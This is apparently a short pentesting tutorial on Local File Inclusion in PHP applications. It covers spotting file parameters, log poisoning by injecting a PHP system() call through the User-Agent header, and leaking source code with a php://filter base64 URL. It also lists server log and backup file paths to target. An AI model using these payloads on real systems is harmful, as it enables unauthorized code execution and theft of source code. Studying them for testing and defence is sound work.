**Local File Inclusion (LFI)** is a web vulnerability that occurs when an application allows users to include local files from the server through manipulable parameters. 

## Identifying LFI

Look for parameters that might reference files, such as:

- `file=`
- `page=`
- `template=`
- `lang=`

**Example vulnerable URL:**
```bash
http://example.com/index.php?page=home.php
```

By manipulating the `page` parameter, you might access unintended files.

## Exploitation Techniques

#### Basic LFI 

Basic LFI occurs when an application directly includes a file based on user input **without proper validation**, allowing attackers to access and execute unintended files.

```bash
http://example.com/index.php?page=about.php
```
The application includes and executes `pages/about.php`. However, an attacker can manipulate this behavior to load arbitrary files.

#### Log Poisoning

1. **Access the log file:**

Apache:
```bash
/var/log/apache2/access.log
/var/log/apache2/error.log
```
Nginx:
```bash
/var/log/nginx/access.log
/var/log/nginx/error.log
```
Custom or PHP errors:
```bash
/var/log/php_errors.log
```

2. **Inject payload into logs**

Make a request to the target with the following header:
```bash
User-Agent: <?php system('id'); ?>
```
This header is usually logged in `/var/log/apache2/access.log` or `/var/log/httpd/access_log`.


#### Forcing PHP File Inclusion Without Execution

By default, including a `.php` file causes the server to execute it rather than display its source code. However, certain methods can bypass execution.

The `php://filter` wrapper allows you to manipulate file streams before execution. Using the `convert.base64-encode` filter, you can encode the PHP file's content and decode it locally.

```bash
http://<target>/vulnerable.php?file=php://filter/convert.base64-encode/resource=index.php
```
This returns the Base64-encoded content of `index.php`. Decode it with a tool or command:

```bash
echo "<base64_content>" | base64 -d
```

**Possible vulnerable files:**
- `index.php`
- `index.php.bak`
- `index.php.save`
- `.index.php.swp` 

